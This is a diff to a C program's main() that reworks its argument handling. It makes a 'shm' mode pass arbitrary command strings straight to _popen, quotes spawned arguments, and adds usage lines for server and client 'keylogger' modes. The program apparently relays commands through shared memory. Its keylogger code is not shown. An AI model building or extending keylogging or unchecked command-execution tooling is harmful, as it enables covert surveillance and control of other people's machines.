@@ -101,17 +101,20 @@ int main(int argc, char *argv[])
     const char* name = "Shared Memory";
     if(argc == 4 && strcmp(argv[1], "spawn") == 0)
     {
-        char cmd[strlen(argv[0]) + strlen(argv[2]) + 3];
+        char cmd[strlen(argv[0]) + strlen(argv[2]) + strlen(argv[3]) + 5];
         strcpy(cmd, argv[0]);
         strcat(cmd, " ");
         strcat(cmd, argv[2]);
         strcat(cmd, " ");
+        strcat(cmd, "\"");
         strcat(cmd, argv[3]);
+        strcat(cmd, "\"");
+        printf("%s\n", cmd);
         spawn(cmd);
         printf("Spawned...\n");
         return 0;
     }
-    if(argc == 3)
+    if(argc == 3 && strcmp(argv[1], "shm") == 0)
     {
         if(strcmp(argv[2], "patch") == 0)
         {
@@ -124,12 +127,8 @@ int main(int argc, char *argv[])
         }
         try
         {
-            const char* powershell = "powershell.exe ";
-            char path[strlen(powershell) + strlen(argv[1]) + strlen(argv[2]) + 2];
-            strcpy(path, powershell);
-            strcat(path, argv[1]);
-            strcat(path, " ");
-            strcat(path, argv[2]);
+            char path[strlen(argv[2]) + 1];
+            strcpy(path, argv[2]);
             FILE *file = _popen(path, "r");
             if(file == NULL)
             {
@@ -174,7 +173,7 @@ int main(int argc, char *argv[])
             return ERROR_CODE;
         }
     }
-    else if(argc == 1)
+    else if(argc == 2 && strcmp(argv[1], "shm") == 0)
     {
         try
         {
@@ -211,7 +210,9 @@ int main(int argc, char *argv[])
     }
     else
     {
-        fprintf(stderr, "Usage: %s [spawn?] [script] [args]\n", argv[0]);
+        fprintf(stderr, "Server Usage: %s [spawn?] [shm] [cmd]\n", argv[0]);
+        fprintf(stderr, "Server Usage: %s [spawn?] [keylogger] [args]\n", argv[0]);
+        fprintf(stderr, "Client Usage: %s [mode(shm|keylogger)]\n", argv[0]);
         return ERROR_CODE;
     }
 
